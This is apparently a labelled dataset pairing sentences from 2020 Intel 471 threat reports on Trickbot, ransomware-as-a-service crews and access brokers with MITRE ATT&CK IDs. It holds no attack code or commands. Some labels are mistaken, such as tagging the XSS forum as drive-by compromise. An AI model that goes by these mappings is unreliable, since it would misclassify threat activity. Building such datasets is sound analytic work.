{"sentence": "Cyber Command and Microsoft shows how resilient of an operation Trickbot is and how much more effort is needed to fully take the botnet offline for good.", "labels": ["S0266"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, {"sentence": "While the actions taken this past week let Trickbot\u2019s operators know they are not operating free of consequence, an multi-pronged effort needs to be made if the botnet is to be fully knocked offline:", "labels": ["S0266"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, {"sentence": "Trickbot down, but is it out?", "labels": ["S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "Since the separate and independent actions taken against Trickbot, we have observed successful disruption of its command and control infrastructure.", "labels": ["S0266", "TA0011"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "However, the actors linked to Trickbot have not ceased their criminal activities.", "labels": ["S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "These actors have continued engaging in ransomware activity, using BazarLoader instead of Trickbot.", "labels": ["T1486", "S0534", "S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "We are unable to assess the long-term impact of the Trickbot disruption activity or whether Trickbot will continue to be used by cybercrime groups.", "labels": ["S0266", "S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "Utilizing their access to Trickbot command and control servers, Cyber Command operators are believed to have modified several Trickbot configuration files that were sent by their C&C infrastructure to Trickbot-infected systems.", "labels": ["S0266", "TA0011", "S0266", "T1105"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "Their actions were believed to be intended to render the bots unable to communicate with Trickbot\u2019s control servers.", "labels": ["S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "Responding to this disruption, Trickbot operators stabilized their operation within 24 hours, restoring working configuration files on their command and control servers.", "labels": ["S0266", "TA0011"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "Cyber Command struck again, poisoning the Trickbot configuration files for a second time.", "labels": ["S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "However, the actors linked to Trickbot are efficient at identifying high-value targets from within their pool of already compromised systems and using second-stage tools such as Cobalt Strike to maintain persistent access to these networks.", "labels": ["S0266", "S0154", "T1105"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "The image reflects the poisoned Trickbot plug-in server configuration.Microsoft joins the fray: Oct. 12, 2020", "labels": ["S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "It was unclear exactly when Microsoft began their own action against Trickbot, but they announced their action publicly on Oct. 12, 2020 [[2](https://blogs.microsoft.com/on-the-issues/2020/10/12/trickbot-ransomware-cyberthreat-us-elections/)].", "labels": ["S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "Unsealed indictments contained a list of IP addresses that Intel 471 identified as belonging to Trickbot or Bazar control server infrastructure [[3](https://noticeofpleadings.com/trickbot/)].", "labels": ["S0266", "S0534", "S0266", "TA0011"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "In that indictment, Microsoft appealed to the court to order U.S. hosting companies responsible for hosting Trickbot controller infrastructure to shut down the infrastructure and \u201ctransfer any content and software hosted at the IP addresses\u201d to Microsoft.", "labels": ["S0266", "TA0011"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "However, we believe Microsoft also successfully impacted Trickbot\u2019s infrastructure that was outside the jurisdiction of U.S. courts.", "labels": ["S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "From Oct. 13, 2020, to Nov. 1, 2020, we began to see the impact of Microsoft's takedown actions against Trickbot\u2019s infrastructure.", "labels": ["S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "During this period, we observed that a significant amount of Trickbot\u2019s infrastructure was rendered inoperable while the Trickbot operators were setting up new infrastructure in response.", "labels": ["S0266", "S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "This allowed Trickbot to maintain an active and working command and control infrastructure, which was degraded significantly compared to the previous month prior to any action.", "labels": ["S0266", "TA0011"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "During this time, Trickbot operators also initiated new infection campaigns via the Emotet malware-as-a-service (MaaS) (see: screenshot below) and other mass-spam sources to rebuild their botnet.", "labels": ["S0266", "S0367"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "Trickbot was distributed by the Emotet service Oct. 19, 2020.", "labels": ["S0266", "S0367"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "Between Oct. 28, 2020 and Nov. 6, 2020, we have not seen any new Trickbot infection campaigns in our monitoring nor in open source reporting.", "labels": ["S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "We observed the number of active and working Trickbot control servers being reduced over time and we were unable to identify any working Trickbot control servers as of Nov. 6.", "labels": ["TA0011", "TA0011"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "The number of active Trickbot control servers diminished in October 2020.", "labels": ["TA0011"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "BazarLoader instead of Trickbot.", "labels": ["S0534", "S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "Cybersecurity and Infrastructure Security Agency (CISA) indicate a recent resurgence of ransomware incidents involving the Ryuk ransomware.", "labels": ["T1486", "S0446", "T1486"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "This strain of ransomware was frequently linked to Trickbot by security researchers [[6](https://unit42.paloaltonetworks.com/ryuk-ransomware/)].", "labels": ["T1486", "S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "In these recent Ryuk attacks, incident responders have reported that instead of seeing Trickbot in the initial stages of an incident, they saw a different malware known as BazarLoader aka KEGTAP.", "labels": ["S0446", "S0266", "S0534"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "BazarLoader is linked to the Trickbot operators in many ways, including shared infrastructure and code similarities.", "labels": ["S0534", "S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "This indicates the actors linked to Trickbot continue to launch targeted ransomware attacks successfully despite the disruption of the Trickbot infrastructure.", "labels": ["S0266", "T1486", "S0266", "T1486"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "It was unclear whether the Trickbot operators will return to using Trickbot or will completely move to using BazarLoader as a replacement.", "labels": ["S0266", "S0266", "S0534"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "Regardless of the switch from Trickbot to BazarLoader, we are encouraged by the overall impact of disruption activity against Trickbot\u2019s infrastructure.", "labels": ["S0266", "S0534", "S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "At the very least, this disruption activity caused the actors behind Trickbot to spend time and effort setting up new infrastructure instead of impacting and ransoming victims.", "labels": ["S0266"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "On Nov 9, 2020, we did see a new version of Trickbot that was distributed via a spam campaign (gtag tar2).", "labels": ["S0266", "T1566"], "document": "intel471_2020-11-10_trickbot-update-november-2020-bazar"}, {"sentence": "Ransomware-as-a-service: The pandemic within a pandemic", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Technical novices, along with seasoned cybersecurity professionals, have witnessed over the past year a slew of ransomware events that have devastated enterprises around the world.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Even those outside of cybersecurity are now familiar with the concept: criminals behind a keyboard have found a way into an organization\u2019s system, prevented anyone from actually using it by locking it up, and won\u2019t let anyone resume normal activity until the organization pays a hefty fee.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "As economies around the world teeter on the edge of disaster as a result of the COVID-19 pandemic, the onslaught of ransomware attacks in 2020 has compounded civil society\u2019s ability to carry on business as usual.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "But even for seasoned professionals, it\u2019s a challenge to measure and quantify just how bad ransomware has gotten.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "What is known is that the criminal groups behind ransomware are flourishing, creating new variants and offering access on underground markets to anyone that has access to corporate networks and a desire to make a substantial amount of illicit money.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Intel 471 has been tracking over 25 different ransomware-as-a-service crews over the past year, ranging from well-known groups that have become synonymous with ransomware, to newly-formed variants that have risen from the failures of old, to completely new variants that may have the ability to unseat the current top-level cabals.", "labels": ["T1486", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "The following is an examination of Ransomware-as-a-service (RaaS) crews that have grown over the past year.", "labels": ["T1486", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "This is not meant to be a definitive measure of the ransomware scene, as what could be considered \u201cdamaging\u201d \u2014 payment amount, system downtime, communications with attackers \u2014 could vary by crew or incident.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "**TIER 3: Emerging RaaS Crews**", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "We can verify that the following variants have been created and are being sold on a RaaS model, but at the present time, there is limited to no information on successful attacks, volume of attacks, payments received or cost of mitigation.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "| Exorcist | July 2020 | None | XSS | No |", "labels": ["T1189"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "| Lolkek | July 2020 | None | XSS | No |", "labels": ["T1189"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "| Muchlove | April 2020 | None | XSS | No |", "labels": ["T1189"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "| Nemty | September 2020 | None | XSS | Yes |", "labels": ["T1189"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "| Rush | July 2020 | None | XSS | No |", "labels": ["T1189"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "| Zeoticus | 1.0 Dec. 2019, 2.0 Sept 2020 | None | XSS/Private channels | No |", "labels": ["T1189"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "| Avaddon | March 2020 | Under 10 | Exploit | Yes |", "labels": ["T1190"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "| Conti | August 2020 | 142 | Private | Yes |", "labels": ["S0575"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "| DarkSide | August 2020 | Under 5 | Exploit | Yes |", "labels": ["T1190"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "| Pysa/Mespinoza | August 2020 | Over 40 | N/A | Yes |", "labels": ["S0583"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "| Ragnar | December 2019 | Over 25 | Exploit | Yes |", "labels": ["T1190"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "| Ranzy | October 2020 | 1 | Exploit & XSS | Yes |", "labels": ["T1190", "T1189"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "| Thanos | August 2020 | Over 5 | Raid | No |", "labels": [], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "The variants are often iterations of past RaaS operations that were either shut down or broken up by law enforcement.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "All of these variants have utilized blogs to \u201cname and shame\u201d victims who have refused to pay ransoms.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "**DoppelPaymer**", "labels": [], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "DoppelPaymer, around since 2019, is associated with the BitPaymer aka FriedEx ransomware.", "labels": ["S0570", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "CrowdStrike has highlighted some similarities between those variants, speculating that DoppelPaymer might be the work of the former BitPaymer group members.", "labels": ["S0570"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "The ransomware itself is usually deployed manually after a network is compromised and sensitive data is exfiltrated.", "labels": ["T1486", "TA0010"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "The DoppelPaymer team operates a Tor-based \u201cDopple leaks\u201d blog, which is used to publish information about compromised companies and their stolen data.", "labels": [], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "The most known and discussed victim of DoppelPaymer ransomware is one against D\u00fcsseldorf University Clinic in September 2020.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "DoppelPaymer has been used in over 125 ransomware incidents in 2020.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "**Egregor/Maze**", "labels": ["S0554", "S0449"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "As this report was being published, the crew behind the Maze ransomware service announced it was shutting down its operations.", "labels": ["S0449", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "There has been speculation that this group\u2019s affiliates will likely be funneled into the services behind Egregor ransomware.", "labels": ["S0554", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Egregor follows a familiar pattern in its operations:", "labels": ["S0554"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Compromise corporate networks to steal sensitive data and deploy ransomware, communicate with victims and demand ransoms, then dump sensitive data on a blog when victim organizations refuse to pay the ransom.", "labels": ["T1486", "TA0010", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "There is evidence that Egregor is also linked to Sekhmet ransomware.", "labels": ["S0554", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Intel 471 researchers found Egregor contained the same Base64 encoded data as Sekhmet where the last row contained additional parameters from a compromised system.", "labels": ["S0554", "T1027"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Researchers also found that Egregor ransom notes were strikingly similar to ones used with Sekhmet.", "labels": ["S0554"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Egregor was found in incidents at Crytek, Ubisoft and Barnes & Noble.", "labels": ["S0554"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Intel 471 found that Maze was used in over 250 ransomware incidents in 2020.", "labels": ["S0449", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Egregor was used in more than 200 incidents.", "labels": ["S0554"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "**Netwalker**", "labels": ["S0457"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "First detected in September 2019, NetWalker is one of the more prolific affiliate services Intel 471 has tracked.", "labels": ["S0457"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "The actors behind it have spent 2020 using phishing emails that leverage the impact and fear of the COVID-19 pandemic to lure victims into loading their malware onto systems.", "labels": ["T1566"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "The actors used a fileless infection technique and allegedly could bypass the user account control component of Windows 7 and newer operating systems.", "labels": ["T1548"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "NetWalker could be operated in two modes: In \u201cnetwork mode,\u201d individual computers or the entire network could be held for ransom and the victim could purchase a decryption tool with a master key or buy the necessary keys to decrypt certain computers.", "labels": ["S0457"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "The most high-profile target hit by Netwalker is Michigan State University, which refused to pay the ransom.", "labels": ["S0457"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Netwalker has been tied to 143 ransomware incidents in 2020.", "labels": ["S0457", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "**REvil**", "labels": ["S0496"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "One of the most ubiquitous ransomware variants on the market, deployments of REvil first were observed on April 17, 2019, where attackers leveraged a vulnerability in Oracle WebLogic servers tracked as CVE-2019-2725.", "labels": ["T1486", "S0496", "T1190"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Two months later, advertisements started popping up on the XSS forum.", "labels": ["T1189"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "[REvil has been](https://intel471.com/blog/changes-in-revil-ransomware-version-2-2/) one of the most active ransomware gangs in recent memory, claiming responsibility for such attacks as those on U.K.-based financial service provider [Travelex](https://techcrunch.com/2020/01/02/travelex-malware/), U.S.-based entertainment and [media law firm](https://www.businessinsider.com/trump-data-ransomware-grubman-law-firm-madonna-2020-5) Grubman Shire Meiselas & Sacks and [23 local governments in Texas](https://www.zdnet.com/article/at-least-20-texas-local-governments-hit-in-coordinated-ransomware-attack/).", "labels": ["S0496", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "One of the most common ways the group gains access to organizations is through remote desktop protocol (RDP) vulnerabilities, such as [the BlueGate vulnerability](https://www.securityweek.com/poc-exploits-created-recently-patched-bluegate-windows-server-flaws), which allows remote code execution by an authorized user.", "labels": ["T1190", "T1190"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "In the case of the Travelex and Grubman Shire Meiselas & Sacks attacks, the representative said networks were compromised by exploiting outdated [Citrix](https://www.cyberscoop.com/citrix-vulnerability-backdoor-fireeye/) and [Pulse Secure](https://www.zdnet.com/article/top-exploits-used-by-ransomware-gangs-are-vpn-bugs-but-rdp-still-reigns-supreme/) remote access software, with the actors allegedly gaining access to an entire network in \"about three minutes.", "labels": ["T1190"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "While the group carries out attacks on its own, it has found the RaaS model brings back more money.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Affiliates are responsible for gaining access to target networks, downloading valuable files and deploying the actual ransomware, while the REvil gang handles victim negotiations and blackmailing, ransom collection and distribution.", "labels": ["TA0001", "T1486", "S0496", "TA0010", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "This model has apparently led to skyrocketing profits: according to the REvil representative, one affiliate's earnings rose from about US$20,000 to US $30,000 per target with another RaaS offering to about US $7 million to $8 million per target in only six months after joining forces with REvil.", "labels": ["S0496", "T1486", "S0496"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Intel 471 has linked REvil to 230 ransomware attacks in 2020.", "labels": ["S0496", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "**Ryuk**", "labels": ["S0446"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "The name \u201cRyuk\u201d could arguably be categorized as synonymous with ransomware, as the variant is one of the most popular, with a strong affiliate program and a large list of victims.", "labels": ["S0446", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "It is often delivered as the last action in the chain of infections brought on by dueling use of the Trickbot botnet and Emotet malwares.", "labels": ["S0266", "S0367"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Recently, we have also witnessed that Ryuk is delivered through the Bazar loader.", "labels": ["S0446", "S0534"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Affiliates follow a model in their attacks: Hiring actors to launch spam campaigns to deliver the actor's banking malware.", "labels": ["T1566"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Then, another set of actors conduct privilege escalation attacks within compromised corporate networks.", "labels": ["TA0004"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Then, teams of as many of five deploy the ransomware and handle negotiations with victims.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Ryuk has exploded over the past year, responsible for millions of ransomware incidents around the world.", "labels": ["S0446", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Some security researchers estimate that Ryuk has been found in as much as one-third of ransomware attacks launched this year.", "labels": ["S0446", "T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "One of the biggest threats from Ryuk this year has been focused on the healthcare sector.", "labels": ["S0446"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "In our next entry, Intel 471 will examine what a business goes through once it has to recover from a ransomware attack.", "labels": ["T1486"], "document": "intel471_2020-11-16_ransomware-as-a-service-2020"}, {"sentence": "Steal, then strike: Access merchants are first clues to future ransomware attacks", "labels": ["T1486"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "While ransomware variants like REvil, Ryuk and DoppelPaymer have become household names for cybersecurity professionals, those deploying ransomware only represent part of the process by which criminals are forcing organizations to either pay them millions or watch their business go under.", "labels": ["T1486", "S0496", "S0446", "T1486"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "A key cog in this growing operation is the interdependency between those who specialize in selling access to compromised systems or stolen information, and those looking to launch ransomware attacks.", "labels": ["T1486", "T1078"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "Data gathered by Intel 471 points to a pattern in numerous ransomware attacks that have occurred in the past 18 months: Criminals in underground forums will advertise access to various breached organizations, and quickly turn to sell access to the highest bidder or strike a deal with an ransomware affiliate in order to share in any profits pulled from a successful payment.", "labels": ["T1486", "T1486", "T1078"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "These partnerships have resulted in a flourishing submarket, where access to corporate networks is sold for six-figure sums directly or via a partnership and cut of paid ransoms.", "labels": ["T1078"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "The compromised credentials are mostly obtained through attackers abusing flaws or security shortcomings in virtual private networks or remote desktop protocol endpoints, which provides the initial entry point into enterprise networks.", "labels": ["T1078"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "Additionally, credential information can come from logs tied to infostealer malware, password spraying or other credential marketplaces in the criminal underground.", "labels": ["T1110"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "Instances show that anywhere from one week to six months after access is obtained and advertised, other known actors on various underground forums look to use or purchase that access to launch ransomware attacks.", "labels": ["T1486", "T1078"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "The targets run the gamut of regions and economic sectors, with the pattern playing out in ransomware attacks on every continent.", "labels": ["T1486"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "One of the highest-profile ransomware attacks to fit this pattern was the attack on Pemex, the state-run oil company based in Mexico.", "labels": ["T1486"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "In November 2019, attackers hit Pemex with DoppelPaymer, demanding $4.5 million in bitcoin to decrypt and return the files.", "labels": ["T1486"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "Intelligence from Intel 471 found that beginning in June 2019, a separate actor was advertising access to 1,500 Pemex servers and personal computers, as well as administrator privileges to the company\u2019s domains, for $150,000.", "labels": ["T1078"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "Another actor Intel 471 had been tracking started asking for access to ransomware-as-a-service affiliate programs, stating that deployment of ransomware on compromised networks should potentially return much more money than just selling the access.", "labels": ["T1486", "T1486", "T1486"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "Days after this, Intel471 learned the actor obtained and modified a version of Thanos, and allegedly deployed it against U.S. businesses.", "labels": [], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "Over the past three months, this actor has frequently tried to sell access to compromised organizations, which range in location, size, and economic sector.", "labels": ["T1078"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "Access merchant partnerships are not exclusive to any one particular ransomware variant or ransomware-as-a-service.", "labels": ["T1486", "T1486"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "Data from Intel 471 shows this pattern following attacks carried out with popular ransomware variants, such as DoppelPaymer, Maze, Netwalker, Ryuk and REvil, as well as lesser-known variants like LockBit, Nefilim, Pysa and Thanos.", "labels": ["T1486", "S0449", "S0457", "S0446", "S0496", "S0583"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "Now, it\u2019s becoming increasingly common for attackers to demand seven- and eight-figure ransoms, partly due to the need to pay off actors that have helped them obtain access to the victim\u2019s system.", "labels": ["T1078"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "One such attack drives home this point: Intel 471 obtained a chat log from a ransomware attack launched last month where a company \u2014 a U.S.-based healthcare provider \u2014 offered to pay a ransom of just under $400,000.", "labels": ["T1486"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "Despite the company\u2019s quick response, the ransomware crew was insulted by the offer and threatened to dump the entire cache of stolen documents unless the figure was pushed several million dollars higher.", "labels": ["T1486"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "How long ransomware crews decide to stay with this partnership model will be something to watch in the coming year.", "labels": ["T1486"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "Intel 471 has observed actions in underground marketplaces that show RaaS groups are beginning to undercut access merchants, by either purchasing their own credential-stealing malware or recruiting teams that specialize in obtaining access.", "labels": ["T1486", "TA0006"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "Additionally, ensuring token-based multi-factor authentication is enabled across an enterprise and scrutinizing all internet-facing remote network connections like RDP can be vital in preventing ransomware attacks.", "labels": ["T1486"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "*This article was part of a series on ransomware attacks in 2020.", "labels": ["T1486"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "[Part 1](https://intel471.com/blog/ransomware-as-a-service-2020-ryuk-maze-revil-egregor-doppelpaymer/) and", "labels": ["T1486"], "document": "intel471_2020-12-01_ransomware-attack-access-merchants-infostealer"}, {"sentence": "DeepMix Market is one of the most well-known Chinese underground marketplaces, even after disappearing for several weeks in 2019 after a sustained DDoS attack.", "labels": ["T1499"], "document": "intel471_2020-12-10_china-cybercrime-undergrond-deepmix-tea"}, {"sentence": "More often, skilled Chinese actors make their way to international forums, such as Exploit, Hack Forums, Raid Forums and XSS. These actors advertise tools and services like any other member: compromised payment cards, information or data, ransomware, cryptomining malware and more.", "labels": ["T1486", "T1189", "T1496"], "document": "intel471_2020-12-10_china-cybercrime-undergrond-deepmix-tea"}, {"sentence": "* Anubis", "labels": [], "document": "intel471_2020-12-10_china-cybercrime-undergrond-deepmix-tea"}, {"sentence": "* AsyncRAT", "labels": [], "document": "intel471_2020-12-10_china-cybercrime-undergrond-deepmix-tea"}, {"sentence": "* Cobalt Strike", "labels": ["S0154"], "document": "intel471_2020-12-10_china-cybercrime-undergrond-deepmix-tea"}, {"sentence": "* Gh0st", "labels": ["S0032"], "document": "intel471_2020-12-10_china-cybercrime-undergrond-deepmix-tea"}, {"sentence": "* Gray Pigeon", "labels": [], "document": "intel471_2020-12-10_china-cybercrime-undergrond-deepmix-tea"}, {"sentence": "* Gray Wolf", "labels": [], "document": "intel471_2020-12-10_china-cybercrime-undergrond-deepmix-tea"}, {"sentence": "* NjRAT", "labels": ["S0385"], "document": "intel471_2020-12-10_china-cybercrime-undergrond-deepmix-tea"}, {"sentence": "* Spynote", "labels": [], "document": "intel471_2020-12-10_china-cybercrime-undergrond-deepmix-tea"}, {"sentence": "We also observed popular tools such as worms, brute forcers, DDoS tools and post-exploitation tools, as well as exploits for vulnerabilities in web servers for Apache, Oracle and Microsoft Windows.", "labels": ["T1110", "T1499", "T1190"], "document": "intel471_2020-12-10_china-cybercrime-undergrond-deepmix-tea"}, {"sentence": "There was also interest in software that mines cryptocurrencies while also attempting to steal wallets or credentials to access online wallets.", "labels": ["T1496", "TA0006"], "document": "intel471_2020-12-10_china-cybercrime-undergrond-deepmix-tea"}, {"sentence": "Additionally, both international (GandCrab, WannaCry) and domestic (FilesLocker) variants of ransomware were placed on various forums.", "labels": ["S0366", "T1486", "T1486"], "document": "intel471_2020-12-10_china-cybercrime-undergrond-deepmix-tea"}, {"sentence": "\"This could be a result of many things, from the pandemic to the massive shift of many cybercriminals to ransomware, where significantly less effort can lead to marginally higher profits.", "labels": ["T1486"], "document": "intel471_2020-12-17_jokers-stash-fbi-interpol-dns"}, {"sentence": "\"Payment card fraud has shifted its attention to e-commerce targets due to a handful of factors including the pandemic forcing consumers to stay at home, and the rise of Magecart-type attacks,\" said a security expert in the financial services industry who asked to remain anonymous.", "labels": [], "document": "intel471_2020-12-17_jokers-stash-fbi-interpol-dns"}, {"sentence": 